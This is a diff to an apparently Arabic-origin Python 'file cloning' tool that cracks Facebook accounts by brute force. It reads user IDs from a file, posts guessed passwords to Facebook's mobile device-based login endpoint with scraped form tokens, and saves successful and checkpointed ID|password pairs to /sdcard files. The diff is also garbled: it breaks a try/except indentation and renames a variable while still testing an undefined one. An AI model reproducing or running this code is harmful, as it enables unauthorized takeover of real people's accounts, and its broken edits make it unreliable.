@@ -140,7 +140,7 @@ def ALSOLTAN():
 	clear()
 	print(f'{G}(1){M}File Cloning')
 	print(f"{G}(2){A}Exit")
-	me=input(f'  اختر : ')
+	me=input(f'  Choose  : ')
 	if me in ["2", "02"]:
 	    exit()
      
@@ -150,7 +150,7 @@ def ALSOLTAN():
 		file = input(f'{A}Enter file path :  {G}')
 		try:
 			fo = open(file,'r').read().splitlines()
-		except FileNotFoundError:
+			except FileNotFoundError:
 			print(f' {E}الملف غير موجود ')
 			exit()
 		print(f' [\033[1;31m1\033[1;37m] Method \033[1;32m1\033[1;37m [\033[1;32mAll ids\033[1;37m] \n [\033[1;31m2\033[1;37m] Method \033[1;32m2\033[1;37m [\033[1;32mold ids\033[1;37m] \n [\033[1;31m3\033[1;37m] Method \033[1;32m3\033[1;37m [\033[1;32mNew ids\033[1;37m]  ')
@@ -215,8 +215,8 @@ def m1(ids,names,passlist):
                         getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        ALSOLTAN=session.cookies.get_dict().keys()
-                        if "c_user" in ALSOLTAN:
+                        A=session.cookies.get_dict().keys()
+                        if "c_user" in AMIN:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [AMIN\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
@@ -225,7 +225,7 @@ def m1(ids,names,passlist):
                                 open(f'/sdcard/AMIN•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in ALSOLTAN:
+                        elif 'checkpoint' in AMIN:
                                 if 'y' in pcp:
                                         print(f'\r\r\x1b[38;5;208m [ALSOLTAN•CP] '+ids+' • '+pas+'\033[1;97m')
                                         open(f'/sdcard/ALSOLTAN•CP.txt', 'a').write(ids+'|'+pas+'\n')
